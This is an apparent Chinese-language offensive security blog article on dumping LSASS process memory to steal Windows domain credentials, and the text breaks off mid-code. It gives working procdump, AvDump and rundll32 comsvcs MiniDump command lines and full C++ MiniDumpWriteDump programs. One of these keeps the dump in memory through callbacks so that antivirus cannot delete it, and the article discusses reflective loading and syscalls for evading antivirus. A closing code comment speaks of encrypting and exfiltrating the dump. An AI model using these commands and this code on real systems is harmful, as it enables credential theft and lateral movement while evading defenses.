# 域渗透-一文了解lsass内存转储攻防技术
## 引言
转储内存是域渗透中重要的一个环节。随着攻防对抗的升级，安全产品出现了如内存保护、PPL、杀dump文件、APIhook等防御手段，传统的内存转储技术在实战中已经逐渐无法使用。本文将由浅入深的介绍常见的内存转储技术，针对不同的防护原理给出不同的dump内存方法。
## 常规手段
### mimikatz::logonpasswords
在  
这篇文章中，作者自己实现了logonpasswords模块，主要分为几个步骤：
  1. 获取sebug权限  
  2. 打开lassass进程，并找到lsass加载的lsasrv.dll模块。
  3. 在lsasrv.dll模块内存中搜索一个已知的表达式，表达式是lsasrv.dll中LsaInitializeProtectedMemory函数的一部分。  
  4. 通过固有的某些偏移量获取到指向 IV 和 AES/DES 密钥的指针  
  5. 根据已知表达式和偏移，找到 内存中的logon sessions部分。遍历并解析出用户名、域名、密码等信息，这里本地测试出现问题：  
没有定位到logon sessions，怀疑是匹配的表达式不正确。看一下mimikatz：  
mimikatz定位的表达式不一样，工具作者表达式源自：  
修改止当前机器版本对应的表达式后，可以成功：  
  6. 通过之前获取到的 IV 和 AES/DES 密钥解密hash  
原作者使用了syscall，该工具在没有做任何免杀的情况下静态能过大多数杀软：  
## 白名单工具
> 我们通常将这些工具称为LOLBins，指攻击者可以使用这些二进制文件执行超出其原始目的的操作。 我们关注LOLBins中导出内存的程序。
### procdump + mimikatz
    procdump.exe -accepteula -ma lsass.exe lsass.dmp
    // or avoid reading lsass by dumping a cloned lsass process
    procdump.exe -accepteula -r -ma lsass.exe lsass.dmp
使用mimikatz解dump文件
### avdump
avdump是杀软Avast包含的程序，具有可信签名
    .\AvDump.exe --pid  --exception_ptr 0 --thread_id 0 --dump_level 1 --dump_file C:\Users\admin\Desktop\lsass.dmp --min_interval 0
### sqldumper.exe
### rdleakdiag.exe
### adplus.exe
### rundll32 minidump
    .\rundll32.exe C:\windows\System32\comsvcs.dll,MiniDump pid C:\temp\lsass.dmp full
有的时候cmd没有sedbug权限，而powershell有，优先使用powershell执行：
## 多语言编程实现
### C++
主要依赖MiniDumpWriteDump：
    #include "stdafx.h"
    #include 
    #include 
    #include 
    #include 
    using namespace std;
    int main() {
        DWORD lsassPID = 0;
        HANDLE lsassHandle = NULL; 
        // Open a handle to lsass.dmp - this is where the minidump file will be saved to
        HANDLE outFile = CreateFile(L"lsass.dmp", GENERIC_ALL, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
        // Find lsass PID   
        HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
        PROCESSENTRY32 processEntry = {};
        processEntry.dwSize = sizeof(PROCESSENTRY32);
        LPCWSTR processName = L"";
        if (Process32First(snapshot, &processEntry)) {
            while (_wcsicmp(processName, L"lsass.exe") != 0) {
                Process32Next(snapshot, &processEntry);
                processName = processEntry.szExeFile;
                lsassPID = processEntry.th32ProcessID;
            }
            wcout 
结合反射加载可以绕过很多不保护内存的杀软，如definder、sysmantec等。
### PS
依旧是使用MiniDumpWriteDump：
### nim
样例代码未获取sedug权限，需要在system下使用。
代码与c++差不多：
    nimble install winim
    nim compile -d:release --opt:size dump.nim
报错缺少gcc.exe,下载mingw并配置环境变量后编译。运行报错：
不知道什么原因，但总归是可以解决的。直接编译免杀效果一般：
## 杀转储文件绕过
很多时候我们担心导出的dump文件被杀软杀了，想要对导出部分进行加密，我们可以使用MiniDump
Callbacks将结果保存在内存中，再进行加密输出，主要依靠MiniDumpWriteDump提供的回调函数。
    BOOL CALLBACK minidumpCallback(
    __in     PVOID callbackParam,
    __in     const PMINIDUMP_CALLBACK_INPUT callbackInput,
    __inout  PMINIDUMP_CALLBACK_OUTPUT callbackOutput
    )
    {
    LPVOID destination = 0, source = 0;
    DWORD bufferSize = 0;
    switch (callbackInput->CallbackType)
    {
    case IoStartCallback:
    callbackOutput->Status = S_FALSE;
    break;
    // Gets called for each lsass process memory read operation
    case IoWriteAllCallback:
    callbackOutput->Status = S_OK;
    // A chunk of minidump data that's been jus read from lsass. 
    // This is the data that would eventually end up in the .dmp file on the disk, but we now have access to it in memory, so we can do whatever we want with it.
    // We will simply save it to dumpBuffer.
    source = callbackInput->Io.Buffer;
    // Calculate location of where we want to store this part of the dump.
    // Destination is start of our dumpBuffer + the offset of the minidump data
    destination = (LPVOID)((DWORD_PTR)dumpBuffer + (DWORD_PTR)callbackInput->Io.Offset);
    // Size of the chunk of minidump that's just been read.
    bufferSize = callbackInput->Io.BufferBytes;
    bytesRead += bufferSize;
    RtlCopyMemory(destination, source, bufferSize);
    printf("[+] Minidump offset: 0x%x; length: 0x%x\n", callbackInput->Io.Offset, bufferSize);
    break;
    case IoFinishCallback:
    callbackOutput->Status = S_OK;
    break;
    default:
    return true;
    }
    return TRUE;
    }
绑定回调函数并调用:
    MINIDUMP_CALLBACK_INFORMATION callbackInfo;
    ZeroMemory(&callbackInfo, sizeof(MINIDUMP_CALLBACK_INFORMATION));
    callbackInfo.CallbackRoutine = &minidumpCallback;
    callbackInfo.CallbackParam = NULL;
    // Dump lsass
    BOOL isDumped = MiniDumpWriteDump(lsassHandle, lsassPID, NULL, MiniDumpWithFullMemory, NULL, NULL, &callbackInfo);
主要是回调函数里的内存操作要注意，首先在堆上申请了一块内存：
    LPVOID dumpBuffer = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, 1024 * 1024 * 75);
之后再将函数执行后生成的数组放入dumpbuffer中：
    destination = (LPVOID)((DWORD_PTR)dumpBuffer + (DWORD_PTR)callbackInput->Io.Offset);
编译后直接执行MiniDumpWriteDump返回0，执行失败，怀疑是需要sedebug权限，这里使用powershell启动成功抓取：
因为powershell是自带sebug权限的：
执行结果和想象的略有不同，看起来回调函数被多次调用了。导出内存是按块进行输出的：
这里我没调试之前是挺疑惑的，因为按我以前的理解，堆在内存中应该是不连续的，并不能像栈一样直接当连续的内存使用。  
但开发的同时说申请的时候HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, 1024 _1024_
75)是一块完整的内存块，是连续的，这里可能因为栈的空间不够大，所以用了堆来存放。
完整的导出代码：
    #include 
    #include 
    #include 
    #pragma comment (lib, "Dbghelp.lib")
    using namespace std;
    // Buffer for saving the minidump
    LPVOID dumpBuffer = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, 1024 * 1024 * 75);
    DWORD bytesRead = 0;
    BOOL CALLBACK minidumpCallback(
    __in     PVOID callbackParam,
    __in     const PMINIDUMP_CALLBACK_INPUT callbackInput,
    __inout  PMINIDUMP_CALLBACK_OUTPUT callbackOutput
    )
    {
    LPVOID destination = 0, source = 0;
    DWORD bufferSize = 0;
    switch (callbackInput->CallbackType)
    {
    case IoStartCallback:
    callbackOutput->Status = S_FALSE;
    break;
    // Gets called for each lsass process memory read operation
    case IoWriteAllCallback:
    callbackOutput->Status = S_OK;
    // A chunk of minidump data that's been jus read from lsass. 
    // This is the data that would eventually end up in the .dmp file on the disk, but we now have access to it in memory, so we can do whatever we want with it.
    // We will simply save it to dumpBuffer.
    source = callbackInput->Io.Buffer;
    // Calculate location of where we want to store this part of the dump.
    // Destination is start of our dumpBuffer + the offset of the minidump data
    destination = (LPVOID)((DWORD_PTR)dumpBuffer + (DWORD_PTR)callbackInput->Io.Offset);
    // Size of the chunk of minidump that's just been read.
    bufferSize = callbackInput->Io.BufferBytes;
    bytesRead += bufferSize;
    RtlCopyMemory(destination, source, bufferSize);
    printf("[+] Minidump offset: 0x%x; length: 0x%x\n", callbackInput->Io.Offset, bufferSize);
    break;
    case IoFinishCallback:
    callbackOutput->Status = S_OK;
    break;
    default:
    return true;
    }
    return TRUE;
    }
    int main() {
    DWORD lsassPID = 0;
    DWORD bytesWritten = 0;
    HANDLE lsassHandle = NULL;
    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    LPCWSTR processName = L"";
    PROCESSENTRY32 processEntry = {};
    processEntry.dwSize = sizeof(PROCESSENTRY32);
    // Get lsass PID
    if (Process32First(snapshot, &processEntry)) {
    while (_wcsicmp(processName, L"lsass.exe") != 0) {
    Process32Next(snapshot, &processEntry);
    processName = processEntry.szExeFile;
    lsassPID = processEntry.th32ProcessID;
    }
    printf("[+] lsass PID=0x%x\n",lsassPID);
    }
    lsassHandle = OpenProcess(PROCESS_ALL_ACCESS, 0, lsassPID);
    // Set up minidump callback
    MINIDUMP_CALLBACK_INFORMATION callbackInfo;
    ZeroMemory(&callbackInfo, sizeof(MINIDUMP_CALLBACK_INFORMATION));
    callbackInfo.CallbackRoutine = &minidumpCallback;
    callbackInfo.CallbackParam = NULL;
    // Dump lsass
    BOOL isDumped = MiniDumpWriteDump(lsassHandle, lsassPID, NULL, MiniDumpWithFullMemory, NULL, NULL, &callbackInfo);
    if (isDumped) 
    {
    // At this point, we have the lsass dump in memory at location dumpBuffer - we can do whatever we want with that buffer, i.e encrypt & exfiltrate